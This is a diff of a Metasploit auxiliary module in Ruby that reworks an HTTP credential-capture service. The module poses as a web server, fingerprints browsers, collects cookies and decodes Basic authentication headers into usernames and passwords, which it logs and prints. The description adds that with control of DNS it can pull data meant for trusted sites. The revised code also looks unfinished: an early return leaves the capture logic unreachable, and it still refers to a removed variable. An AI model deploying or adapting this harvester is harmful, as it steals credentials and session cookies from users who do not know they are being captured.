@@ -7,18 +7,19 @@
 require 'msf/core'
 
 
-class Metasploit3 < Msf::Auxiliary
+class Metasploit4 < Msf::Auxiliary
 
-  include Msf::Exploit::Remote::TcpServer
+  include Msf::Exploit::Remote::HttpServer
   include Msf::Auxiliary::Report
 
 
   def initialize
     super(
-      'Name'        => 'Authentication Capture: HTTP',
+      'Name'        => 'HTTP Capture Service',
       'Description'    => %q{
-        This module provides a fake HTTP service that
-      is designed to capture authentication credentials.
+        This module provides a HTTP service that is designed to capture
+        data from web browsers. If the user controls DNS for the network,
+        this module can extract information reserved for trusted websites.
       },
       'Author'      => ['ddz', 'hdm'],
       'License'     => MSF_LICENSE,
@@ -36,21 +37,16 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
-        OptPath.new('TEMPLATE',   [ false, "The HTML template to serve in responses",
+        OptPath.new('TEMPLATE',   [ false, "The HTML template to serve in visible responses",
             File.join(Msf::Config.data_directory, "exploits", "capture", "http", "index.html")
           ]
         ),
-        OptPath.new('SITELIST',   [ false, "The list of URLs that should be used for cookie capture",
+        OptPath.new('SITES',   [ false, "The list of domains that we control and should collect from",
             File.join(Msf::Config.data_directory, "exploits", "capture", "http", "sites.txt")
           ]
         ),
-        OptPath.new('FORMSDIR',   [ false, "The directory containing form snippets (example.com.txt)",
-            File.join(Msf::Config.data_directory, "exploits", "capture", "http", "forms")
-          ]
-        ),
-        OptAddress.new('AUTOPWN_HOST',[ false, "The IP address of the browser_autopwn service ", nil ]),
-        OptPort.new('AUTOPWN_PORT',[ false, "The SRVPORT port of the browser_autopwn service ", nil ]),
-        OptString.new('AUTOPWN_URI',[ false, "The URIPATH of the browser_autopwn service ", nil ]),
+        OptString.new('REDIRECT_URL',[ false, "An optional URL to redirect browsers to after data collection", nil ]),
+        OptString.new('URIPATH', [ false,  "The base URI to use for this module (default: /)", "/"])
       ], self.class)
   end
 
@@ -59,122 +55,47 @@ class Metasploit3 < Msf::Auxiliary
     false
   end
 
-  def run
-    @formsdir = datastore['FORMSDIR']
+  def setup
     @template = datastore['TEMPLATE']
-    @sitelist = datastore['SITELIST']
+    @sitelist = datastore['SITES']
     @myhost   = datastore['SRVHOST']
     @myport   = datastore['SRVPORT']
 
-    @myautopwn_host =  datastore['AUTOPWN_HOST']
-    @myautopwn_port =  datastore['AUTOPWN_PORT']
-    @myautopwn_uri  =  datastore['AUTOPWN_URI']
-    @myautopwn      = false
+    @redirect_url = datastore['REDIRECT_URL']
 
-    if(@myautopwn_host and @myautopwn_port and @myautopwn_uri)
-      @myautopwn = true
-    end
+    # print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
+  end
 
-    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
+  def run
     exploit()
   end
 
-  def on_client_connect(c)
-    c.extend(Rex::Proto::Http::ServerClient)
-    c.init_cli(self)
-  end
+  def on_request_uri(cli, req)
 
-  def on_client_data(cli)
-    begin
-      data = cli.get_once(-1, 5)
-      raise ::Errno::ECONNABORTED if !data or data.length == 0
-      case cli.request.parse(data)
-        when Rex::Proto::Http::Packet::ParseCode::Completed
-          dispatch_request(cli, cli.request)
-          cli.reset_cli
-        when  Rex::Proto::Http::Packet::ParseCode::Error
-          close_client(cli)
-      end
-    rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
-    rescue ::OpenSSL::SSL::SSLError
-    rescue ::Exception
-      print_error("Error: #{$!.class} #{$!} #{$!.backtrace}")
-    end
-
-    close_client(cli)
-  end
-
-  def close_client(cli)
-    cli.close
-    # Require to clean up the service properly
-    raise ::EOFError
-  end
-
-  def dispatch_request(cli, req)
-
-    phost = cli.peerhost
-
-    os_name = nil
-    os_type = nil
-    os_vers = nil
-    os_arch = 'x86'
-
-    ua_name = nil
-    ua_vers = nil
-
-    ua = req['User-Agent']
-
-    case (ua)
-      when /rv:([\d\.]+)/
-        ua_name = 'FF'
-        ua_vers = $1
-      when /Mozilla\/[0-9]\.[0-9] \(compatible; MSIE ([0-9]+\.[0-9]+)/
-        ua_name = 'IE'
-        ua_vers = $1
-      when /Version\/(\d+\.\d+\.\d+).*Safari/
-        ua_name = 'Safari'
-        ua_vers = $1
-    end
-
-    case (ua)
-      when /Windows/
-        os_name = 'Windows'
-      when /Linux/
-        os_name = 'Linux'
-      when /iPhone/
-        os_name = 'iPhone'
-        os_arch = 'armle'
-      when /Mac OS X/
-        os_name = 'Mac'
-    end
-
-    case (ua)
-      when /PPC/
-        os_arch = 'ppc'
-    end
-
-    os_name ||= 'Unknown'
-
-    mysrc = Rex::Socket.source_address(cli.peerhost)
-    hhead = (req['Host'] || @myhost)
+    peer_addr   = cli.peerhost
+    self_addr   = Rex::Socket.source_address(cli.peerhost)
+    self_host   = req['Host'] || @myhost
+    self_port   = @myport
 
     if req.resource =~ /^http\:\/+([^\/]+)(\/*.*)/
-      hhead = $1
+      self_host= $1
       req.resource = $2
     end
 
-    if hhead =~ /^(.*):(\d+)\s*$/
-      hhead = $1
-      nport = $2.to_i
+    if self_host =~ /^(.*):(\d+)\s*$/
+      self_host = $1
+      self_port = $2.to_i
     end
 
-    @myport = nport || 80
+    ua_match = fingerprint_user_agent(req['User-Agent'].to_s)
+    cookies  = req['Cookie'] || ''
 
 
-    cookies = req['Cookie'] || ''
+    print_status([peer_addr, self_addr, self_host, self_port, ua_match, cookies].inspect)
+    send_response(cli, "OK")
+    return
 
-
-    if(cookies.length > 0)
+    if cookies.length > 0
       report_note(
         :host => cli.peerhost,
         :type => "http_cookies",
@@ -188,8 +109,8 @@ class Metasploit3 < Msf::Auxiliary
       basic,auth = req['Authorization'].split(/\s+/)
       user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
       report_auth_info(
-        :host      => cli.peerhost,
-        :port      => @myport,
+        :host      => peer_addr,
+        :port      => self_port,
         :sname     => (ssl ? "https" : "http"),
         :user      => user,
         :pass      => pass,
@@ -198,10 +119,10 @@ class Metasploit3 < Msf::Auxiliary
       )
 
       report_note(
-        :host     => cli.peerhost,
+        :host     => self_host,
         :type     => "http_auth_extra",
         :data     => req.resource.to_s,
-        :update => :unique_data
+        :update   => :unique_data
       )
       print_status("HTTP LOGIN #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}")
     end
